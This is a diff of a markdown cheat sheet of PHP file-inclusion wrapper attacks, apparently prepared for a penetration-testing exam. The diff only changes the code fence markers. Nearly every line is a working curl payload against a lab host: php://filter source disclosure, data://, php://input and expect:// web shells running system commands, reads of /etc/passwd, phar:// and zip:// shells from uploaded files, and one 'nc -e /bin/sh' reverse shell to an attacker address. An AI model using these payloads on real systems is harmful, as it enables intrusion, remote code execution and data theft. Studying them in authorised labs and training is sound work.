@@ -20,7 +20,7 @@ Most Important Wrappers with Examples Below
 5. phar:// or zip:// (after upload)
 
 1.### php://filter (⭐⭐⭐ – Most important for reading source)
-```bash
+<<<
 # Basic base64 encode (use this first 90% of the time)
 curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=index.php"
 
@@ -35,17 +35,17 @@ curl "http://10.10.10.10/index.php?page=php://filter/convert.iconv.UTF8.CSISO202
 
 # Case bypass
 curl "http://10.10.10.10/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php"
-```
+>>>
 
 2.### data:// (⭐⭐⭐ – Instant RCE if allow_url_include = On)
 First create your base64 payload (do this once in your exam VM):
-```bash
+<<<
 echo -n '<?php system($_GET["cmd"]); ?>' | base64
 # Output: PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4=
-```
+>>>
 
 Then use:
-```bash
+<<<
 # Basic data stream RCE
 curl "http://10.10.10.10/index.php?page=data://text/plain,<?php%20system('id');?>"
 
@@ -54,55 +54,55 @@ curl "http://10.10.10.10/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGV
 
 # With comma bypass
 curl "http://10.10.10.10/index.php?page=data://text/plain,,<?php%20system('cat /etc/passwd');?>"
-```
+>>>
 
 3.### expect:// (⭐⭐ – Rare but instant win if enabled)
-```bash
+<<<
 curl "http://10.10.10.10/index.php?page=expect://id"
 curl "http://10.10.10.10/index.php?page=expect://whoami"
 curl "http://10.10.10.10/index.php?page=expect://cat /etc/passwd"
 curl "http://10.10.10.10/index.php?page=expect://nc -e /bin/sh 10.10.14.X 443"
-```
+>>>
 
 4.### php://input (⭐⭐ – RCE when POST is allowed)
-```bash
+<<<
 curl -X POST --data '<?php system("id"); ?>' "http://10.10.10.10/index.php?page=php://input"
 curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://10.10.10.10/index.php?page=php://input&cmd=whoami"
-```
+>>>
 
 5.### phar:// (⭐⭐ – When you can upload a ZIP/JPG)
-```bash
+<<<
 # Assuming you uploaded evil.jpg containing shell.php
 curl "http://10.10.10.10/index.php?page=phar://./uploads/evil.jpg/shell.php"
 curl "http://10.10.10.10/index.php?page=phar://./uploads/evil.jpg/shell.php?cmd=id"
-```
+>>>
 
 6.### zip:// (Older version of phar://)
-```bash
+<<<
 curl "http://10.10.10.10/index.php?page=zip://uploads/evil.zip%23shell.php"
 curl "http://10.10.10.10/index.php?page=zip://evil.jpg%23shell.php"
-```
+>>>
 
 7.### file:// (Almost never works but try anyway)
-```bash
+<<<
 curl "http://10.10.10.10/index.php?page=file:///etc/passwd"
-```
+>>>
 
 8.### Wrapper nesting / advanced bypasses
-```bash
+<<<
 # php://filter + data:// nesting
 curl "http://10.10.10.10/index.php?page=php://filter/resource=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW1wiY21kXCJdKTsgPz4="
 
 # php://filter + php://input
 curl -X POST --data '<?php system("id"); ?>' "http://10.10.10.10/index.php?page=php://filter/resource=php://input"
-```
+>>>
 
 9.### Null byte & truncation (old PHP versions)
-```bash
+<<<
 curl "http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00"
 curl "http://10.10.10.10/index.php?page=../../../../etc/passwd%00"
 # Truncation: 4000+ characters then %00
-```
+>>>
 
 ### Exam Priority Order (what to try first → last)
 1. php://filter/convert.base64-encode/resource=←file→  (⭐⭐⭐)
